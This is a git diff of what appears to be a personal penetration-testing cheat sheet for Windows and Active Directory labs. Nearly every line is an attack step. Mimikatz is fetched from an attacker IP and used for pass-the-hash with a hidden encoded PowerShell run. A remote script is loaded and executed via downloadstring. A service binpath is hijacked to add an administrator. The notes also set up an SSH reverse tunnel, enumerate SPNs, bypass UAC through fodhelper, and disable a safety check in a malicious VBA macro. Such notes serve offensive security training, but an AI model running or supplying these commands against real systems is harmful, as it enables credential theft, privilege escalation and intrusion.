@@ -87,7 +87,7 @@ MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
 
 ```pwsh
 iwr -uri http://192.168.45.153/mimikatz.exe -Outfile C:\Users\Public\mimikatz.exe
-.\mimikatz.exe
+C:\Users\Public\mimikatz.exe
 ```
 
 ```
@@ -111,6 +111,7 @@ $EncodedText
 ```
 
 ```
+privilege::debug
 sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e /run:"powershell -exec bypass -nop -w hidden -e <base64-encoded command>"
 ```
 
@@ -148,11 +149,21 @@ iex((new-object system.net.webclient).downloadstring('http://192.168.45.153/Powe
 
 Invoke-AllChecks
 
-sc.exe config SNMPTRAP binpath= "net localgroup Administrators nina /add" obj= "LocalSystem"
+sc.exe config SNMPTRAP binpath= "net localgroup Administrators nina /add" obj= "LocalSystem" start= auto
 
 sc.exe qc SNMPTRAP
 
 sc.exe start SNMPTRAP
+```
+
+```bash
+ssh -N -R 127.0.0.1:8081:172.16.155.194:8081 kali@192.168.45.x
+```
+
+Obtain a list of SPNs
+
+```pwsh
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
 ```
 
 ```bash
@@ -189,7 +200,6 @@ New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Na
 
 C:\Windows\System32\fodhelper.exe
 ```
-
 
 ```pwsh
 import sys
@@ -2464,9 +2474,9 @@ End Function
 
 
 Function MyMacro()
-    If ActiveDocument.Name <> Nuts("clipboard3") Then
-        Exit Function
-    End If
+    'If ActiveDocument.Name <> Nuts("clipboard3") Then
+    '   Exit Function
+    'End If
 
     Dim Apples As String
     Dim Water As String
